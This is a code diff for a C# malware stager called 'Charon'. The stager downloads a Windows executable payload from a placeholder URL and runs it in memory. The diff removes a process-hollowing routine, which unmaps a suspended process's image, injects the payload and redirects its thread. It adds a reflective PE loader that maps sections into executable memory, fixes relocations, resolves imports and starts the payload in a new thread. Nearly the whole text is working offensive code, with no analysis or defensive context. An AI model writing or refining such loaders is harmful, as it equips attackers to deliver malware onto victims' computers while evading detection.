@@ -32,7 +32,7 @@ namespace Charon
 
             try
             {
-                Log.W("[*] Downloading payload from %DOWNLOAD_URL%");
+                Log.W("[*] Downloading payload...");
                 byte[] peBytes;
                 using (WebClient wc = new WebClient())
                 {
@@ -40,238 +40,262 @@ namespace Charon
                 }
                 Log.W("[+] Downloaded {0} bytes", peBytes.Length);
 
-                RunPE.Execute(peBytes, @"%SPAWN_PROCESS%");
+                PEMapper.Execute(peBytes);
             }
             catch (Exception ex)
             {
-                Log.W("[-] Stager error: {0}", ex.Message);
+                Log.W("[-] Stager error: {0}", ex.ToString());
             }
         }
     }
 
-    internal static class RunPE
+    internal static class PEMapper
     {
-        const uint CREATE_SUSPENDED = 0x4;
         const uint MEM_COMMIT = 0x1000;
         const uint MEM_RESERVE = 0x2000;
         const uint PAGE_EXECUTE_READWRITE = 0x40;
-
-        // x64 CONTEXT layout
-        const int CONTEXT64_SIZE = 1232;
-        const int CTX_FLAGS_OFFSET = 0x30;
-        const int CTX_RCX_OFFSET = 0x80;
-        const int CTX_RDX_OFFSET = 0x88;
-        const uint CONTEXT_FULL = 0x10000B;
-
-        [StructLayout(LayoutKind.Sequential)]
-        struct STARTUPINFO
-        {
-            public uint cb;
-            public IntPtr lpReserved, lpDesktop, lpTitle;
-            public uint dwX, dwY, dwXSize, dwYSize;
-            public uint dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
-            public ushort wShowWindow, cbReserved2;
-            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        struct PROCESS_INFORMATION
-        {
-            public IntPtr hProcess, hThread;
-            public uint dwProcessId, dwThreadId;
-        }
-
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        static extern bool CreateProcessW(
-            string lpApplicationName, string lpCommandLine,
-            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
-            bool bInheritHandles, uint dwCreationFlags,
-            IntPtr lpEnvironment, string lpCurrentDirectory,
-            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
-        [DllImport("ntdll.dll")]
-        static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr pBaseAddress);
+        const ushort IMAGE_REL_BASED_DIR64 = 10;
+        const ushort IMAGE_REL_BASED_HIGHLOW = 3;
+        const ushort IMAGE_REL_BASED_ABSOLUTE = 0;
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr VirtualAllocEx(
-            IntPtr hProcess, IntPtr lpAddress, uint dwSize,
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
             uint flAllocationType, uint flProtect);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool WriteProcessMemory(
-            IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
-            uint nSize, out uint lpNumberOfBytesWritten);
+        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
+            uint flNewProtect, out uint lpflOldProtect);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool ReadProcessMemory(
-            IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
-            uint nSize, out uint lpNumberOfBytesRead);
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern IntPtr LoadLibraryA(string lpLibFileName);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern uint ResumeThread(IntPtr hThread);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, IntPtr lpProcName);
 
         [DllImport("kernel32.dll")]
-        static extern uint GetLastError();
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
 
-        public static void Execute(byte[] payload, string targetProcess)
+        [DllImport("kernel32.dll")]
+        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        public static void Execute(byte[] payload)
         {
-            // --- Parse PE headers ---
+            // --- Validate PE ---
             if (payload.Length < 0x40 || BitConverter.ToUInt16(payload, 0) != 0x5A4D)
             {
-                Log.W("[-] Invalid PE: bad MZ header");
+                Log.W("[-] Invalid PE: bad MZ");
                 return;
             }
 
             int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
-            if (e_lfanew < 0 || e_lfanew + 4 > payload.Length)
-            {
-                Log.W("[-] Invalid PE: bad e_lfanew");
-                return;
-            }
             if (BitConverter.ToUInt32(payload, e_lfanew) != 0x00004550)
             {
-                Log.W("[-] Invalid PE: bad PE signature");
+                Log.W("[-] Invalid PE signature");
                 return;
             }
 
-            int optHeaderOffset = e_lfanew + 24;
-            ushort magic = BitConverter.ToUInt16(payload, optHeaderOffset);
+            int optOff = e_lfanew + 24;
+            ushort magic = BitConverter.ToUInt16(payload, optOff);
             if (magic != 0x20B)
             {
-                Log.W("[-] Not a PE32+ (x64) binary, magic: 0x{0:X}", magic);
+                Log.W("[-] Not PE32+ (x64)");
                 return;
             }
 
-            uint entryPointRva = BitConverter.ToUInt32(payload, optHeaderOffset + 16);
-            long imageBase = BitConverter.ToInt64(payload, optHeaderOffset + 24);
-            uint sizeOfImage = BitConverter.ToUInt32(payload, optHeaderOffset + 56);
-            uint sizeOfHeaders = BitConverter.ToUInt32(payload, optHeaderOffset + 60);
-            ushort numberOfSections = BitConverter.ToUInt16(payload, e_lfanew + 6);
-            ushort sizeOfOptionalHeader = BitConverter.ToUInt16(payload, e_lfanew + 20);
+            uint entryPointRva = BitConverter.ToUInt32(payload, optOff + 16);
+            long preferredBase = BitConverter.ToInt64(payload, optOff + 24);
+            uint sizeOfImage = BitConverter.ToUInt32(payload, optOff + 56);
+            uint sizeOfHeaders = BitConverter.ToUInt32(payload, optOff + 60);
+            ushort numSections = BitConverter.ToUInt16(payload, e_lfanew + 6);
+            ushort optHeaderSize = BitConverter.ToUInt16(payload, e_lfanew + 20);
 
-            Log.W("[+] PE parsed: ImageBase=0x{0:X} SizeOfImage=0x{1:X} EntryRVA=0x{2:X} Sections={3}",
-                imageBase, sizeOfImage, entryPointRva, numberOfSections);
+            Log.W("[+] PE: ImageBase=0x{0:X} Size=0x{1:X} EP=0x{2:X} Sections={3}",
+                preferredBase, sizeOfImage, entryPointRva, numSections);
 
-            // --- Create suspended process ---
-            STARTUPINFO si = new STARTUPINFO();
-            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
-            PROCESS_INFORMATION pi;
+            // --- Allocate memory ---
+            IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, sizeOfImage,
+                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-            if (!CreateProcessW(targetProcess, null,
-                IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED,
-                IntPtr.Zero, null, ref si, out pi))
+            if (baseAddr == IntPtr.Zero)
             {
-                Log.W("[-] CreateProcessW failed: {0}", Marshal.GetLastWin32Error());
+                Log.W("[-] VirtualAlloc failed: {0}", Marshal.GetLastWin32Error());
                 return;
             }
-            Log.W("[+] Created suspended process PID={0}", pi.dwProcessId);
+            Log.W("[+] Allocated at 0x{0:X}", (long)baseAddr);
 
-            // Allocate 16-byte aligned CONTEXT
-            IntPtr rawCtx = Marshal.AllocHGlobal(CONTEXT64_SIZE + 16);
-            IntPtr ctx = (IntPtr)(((long)rawCtx + 15) & ~15L);
+            // --- Copy headers ---
+            Marshal.Copy(payload, 0, baseAddr, (int)sizeOfHeaders);
 
-            try
+            // --- Copy sections ---
+            int sectionTable = e_lfanew + 24 + optHeaderSize;
+            for (int i = 0; i < numSections; i++)
             {
-                for (int i = 0; i < CONTEXT64_SIZE; i++)
-                    Marshal.WriteByte(ctx, i, 0);
+                int shdr = sectionTable + (i * 40);
+                uint va = BitConverter.ToUInt32(payload, shdr + 12);
+                uint rawSize = BitConverter.ToUInt32(payload, shdr + 16);
+                uint rawPtr = BitConverter.ToUInt32(payload, shdr + 20);
 
-                Marshal.WriteInt32(ctx, CTX_FLAGS_OFFSET, (int)CONTEXT_FULL);
+                if (rawSize == 0 || rawPtr == 0) continue;
 
-                if (!GetThreadContext(pi.hThread, ctx))
+                Marshal.Copy(payload, (int)rawPtr, (IntPtr)((long)baseAddr + va), (int)rawSize);
+                Log.W("[+] Section {0}: VA=0x{1:X} Size=0x{2:X}", i, va, rawSize);
+            }
+
+            // --- Process relocations ---
+            long delta = (long)baseAddr - preferredBase;
+            if (delta != 0)
+            {
+                Log.W("[*] Relocation delta: 0x{0:X}", delta);
+                // Relocation directory is at optional header offset 152 (data directory index 5)
+                uint relocRva = BitConverter.ToUInt32(payload, optOff + 152);
+                uint relocSize = BitConverter.ToUInt32(payload, optOff + 156);
+
+                if (relocRva > 0 && relocSize > 0)
                 {
-                    Log.W("[-] GetThreadContext failed: {0}", Marshal.GetLastWin32Error());
-                    TerminateProcess(pi.hProcess, 1);
-                    return;
+                    int relocCount = 0;
+                    IntPtr relocBase = (IntPtr)((long)baseAddr + relocRva);
+                    uint offset = 0;
+
+                    while (offset < relocSize)
+                    {
+                        uint blockRva = (uint)Marshal.ReadInt32(relocBase, (int)offset);
+                        uint blockSize = (uint)Marshal.ReadInt32(relocBase, (int)offset + 4);
+
+                        if (blockSize == 0) break;
+
+                        uint numEntries = (blockSize - 8) / 2;
+                        for (uint j = 0; j < numEntries; j++)
+                        {
+                            ushort entry = (ushort)Marshal.ReadInt16(relocBase, (int)offset + 8 + (int)(j * 2));
+                            ushort type = (ushort)(entry >> 12);
+                            ushort off = (ushort)(entry & 0xFFF);
+
+                            if (type == IMAGE_REL_BASED_DIR64)
+                            {
+                                IntPtr patchAddr = (IntPtr)((long)baseAddr + blockRva + off);
+                                long val = Marshal.ReadInt64(patchAddr);
+                                Marshal.WriteInt64(patchAddr, val + delta);
+                                relocCount++;
+                            }
+                            else if (type == IMAGE_REL_BASED_HIGHLOW)
+                            {
+                                IntPtr patchAddr = (IntPtr)((long)baseAddr + blockRva + off);
+                                int val = Marshal.ReadInt32(patchAddr);
+                                Marshal.WriteInt32(patchAddr, val + (int)delta);
+                                relocCount++;
+                            }
+                        }
+
+                        offset += blockSize;
+                    }
+                    Log.W("[+] Applied {0} relocations", relocCount);
                 }
-
-                long pebAddress = Marshal.ReadInt64(ctx, CTX_RDX_OFFSET);
-                Log.W("[+] PEB at 0x{0:X}", pebAddress);
-
-                byte[] buf8 = new byte[8];
-                uint br;
-                ReadProcessMemory(pi.hProcess, (IntPtr)(pebAddress + 0x10), buf8, 8, out br);
-                long originalImageBase = BitConverter.ToInt64(buf8, 0);
-                Log.W("[+] Original ImageBase=0x{0:X}", originalImageBase);
-
-                // --- Hollow ---
-                uint unmapResult = NtUnmapViewOfSection(pi.hProcess, (IntPtr)originalImageBase);
-                Log.W("[*] NtUnmapViewOfSection = 0x{0:X}", unmapResult);
-
-                IntPtr newBase = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase,
-                    sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-                if (newBase == IntPtr.Zero)
+                else
                 {
-                    Log.W("[-] VirtualAllocEx failed: {0}", Marshal.GetLastWin32Error());
-                    TerminateProcess(pi.hProcess, 1);
-                    return;
+                    Log.W("[!] No relocation table — binary may crash");
                 }
-                Log.W("[+] Allocated at 0x{0:X}", (long)newBase);
+            }
+            else
+            {
+                Log.W("[+] No relocations needed (loaded at preferred base)");
+            }
 
-                // --- Write PE ---
-                uint bw;
-                byte[] headerBytes = new byte[sizeOfHeaders];
-                Buffer.BlockCopy(payload, 0, headerBytes, 0, (int)sizeOfHeaders);
-                WriteProcessMemory(pi.hProcess, newBase, headerBytes, sizeOfHeaders, out bw);
-                Log.W("[+] Wrote headers ({0} bytes)", bw);
+            // --- Resolve imports ---
+            // Import directory is at optional header offset 120 (data directory index 1)
+            uint importRva = BitConverter.ToUInt32(payload, optOff + 120);
+            uint importSize = BitConverter.ToUInt32(payload, optOff + 124);
 
-                int sectionTableOffset = e_lfanew + 24 + sizeOfOptionalHeader;
-                for (int i = 0; i < numberOfSections; i++)
+            if (importRva > 0)
+            {
+                int importCount = 0;
+                int idt = (int)importRva; // offset into mapped image
+                int entrySize = 20; // IMAGE_IMPORT_DESCRIPTOR size
+
+                while (true)
                 {
-                    int shdr = sectionTableOffset + (i * 40);
-                    uint virtualAddress = BitConverter.ToUInt32(payload, shdr + 12);
-                    uint sizeOfRawData = BitConverter.ToUInt32(payload, shdr + 16);
-                    uint pointerToRawData = BitConverter.ToUInt32(payload, shdr + 20);
+                    IntPtr idtAddr = (IntPtr)((long)baseAddr + idt);
+                    uint originalFirstThunk = (uint)Marshal.ReadInt32(idtAddr, 0);
+                    uint nameRva = (uint)Marshal.ReadInt32(idtAddr, 12);
+                    uint firstThunk = (uint)Marshal.ReadInt32(idtAddr, 16);
 
-                    if (sizeOfRawData == 0 || pointerToRawData == 0)
+                    if (nameRva == 0) break;
+
+                    string dllName = Marshal.PtrToStringAnsi((IntPtr)((long)baseAddr + nameRva));
+                    IntPtr hModule = LoadLibraryA(dllName);
+
+                    if (hModule == IntPtr.Zero)
+                    {
+                        Log.W("[-] Failed to load: {0}", dllName);
+                        idt += entrySize;
                         continue;
+                    }
 
-                    byte[] section = new byte[sizeOfRawData];
-                    Buffer.BlockCopy(payload, (int)pointerToRawData, section, 0, (int)sizeOfRawData);
-                    WriteProcessMemory(pi.hProcess, (IntPtr)((long)newBase + virtualAddress),
-                        section, sizeOfRawData, out bw);
-                    Log.W("[+] Section {0}: VA=0x{1:X} Size=0x{2:X}", i, virtualAddress, sizeOfRawData);
+                    uint thunkRva = originalFirstThunk != 0 ? originalFirstThunk : firstThunk;
+                    uint iatRva = firstThunk;
+                    int funcCount = 0;
+
+                    while (true)
+                    {
+                        IntPtr thunkAddr = (IntPtr)((long)baseAddr + thunkRva);
+                        IntPtr iatAddr = (IntPtr)((long)baseAddr + iatRva);
+                        long thunkVal = Marshal.ReadInt64(thunkAddr);
+
+                        if (thunkVal == 0) break;
+
+                        IntPtr funcAddr;
+                        if ((thunkVal & (1L << 63)) != 0)
+                        {
+                            // Import by ordinal
+                            int ordinal = (int)(thunkVal & 0xFFFF);
+                            funcAddr = GetProcAddress(hModule, (IntPtr)ordinal);
+                        }
+                        else
+                        {
+                            // Import by name (skip 2-byte hint)
+                            IntPtr nameAddr = (IntPtr)((long)baseAddr + thunkVal + 2);
+                            string funcName = Marshal.PtrToStringAnsi(nameAddr);
+                            funcAddr = GetProcAddress(hModule, funcName);
+                        }
+
+                        if (funcAddr == IntPtr.Zero)
+                        {
+                            Log.W("[-] Failed to resolve: {0}!?", dllName);
+                        }
+
+                        Marshal.WriteInt64(iatAddr, (long)funcAddr);
+                        funcCount++;
+                        thunkRva += 8;
+                        iatRva += 8;
+                    }
+
+                    importCount++;
+                    Log.W("[+] {0}: {1} functions", dllName, funcCount);
+                    idt += entrySize;
                 }
-
-                if ((long)newBase != originalImageBase)
-                {
-                    byte[] baseBytes = BitConverter.GetBytes((long)newBase);
-                    WriteProcessMemory(pi.hProcess, (IntPtr)(pebAddress + 0x10), baseBytes, 8, out bw);
-                    Log.W("[+] Updated PEB ImageBase");
-                }
-
-                long entryPoint = (long)newBase + entryPointRva;
-                Marshal.WriteInt64(ctx, CTX_RCX_OFFSET, entryPoint);
-
-                if (!SetThreadContext(pi.hThread, ctx))
-                {
-                    Log.W("[-] SetThreadContext failed: {0}", Marshal.GetLastWin32Error());
-                    TerminateProcess(pi.hProcess, 1);
-                    return;
-                }
-                Log.W("[+] EntryPoint set to 0x{0:X}", entryPoint);
-
-                ResumeThread(pi.hThread);
-                Log.W("[+] Thread resumed — payload should be running in PID {0}", pi.dwProcessId);
+                Log.W("[+] Resolved imports from {0} DLLs", importCount);
             }
-            catch (Exception ex)
+
+            // --- Execute entry point in new thread ---
+            IntPtr entryPoint = (IntPtr)((long)baseAddr + entryPointRva);
+            Log.W("[*] Starting thread at 0x{0:X}", (long)entryPoint);
+
+            uint threadId;
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, entryPoint, IntPtr.Zero, 0, out threadId);
+
+            if (hThread == IntPtr.Zero)
             {
-                Log.W("[-] RunPE exception: {0}", ex.Message);
-                TerminateProcess(pi.hProcess, 1);
+                Log.W("[-] CreateThread failed: {0}", Marshal.GetLastWin32Error());
+                return;
             }
-            finally
-            {
-                Marshal.FreeHGlobal(rawCtx);
-            }
+
+            Log.W("[+] Thread started TID={0} — payload running", threadId);
+
+            // Wait for the thread indefinitely so the process doesn't exit
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
     }
 }
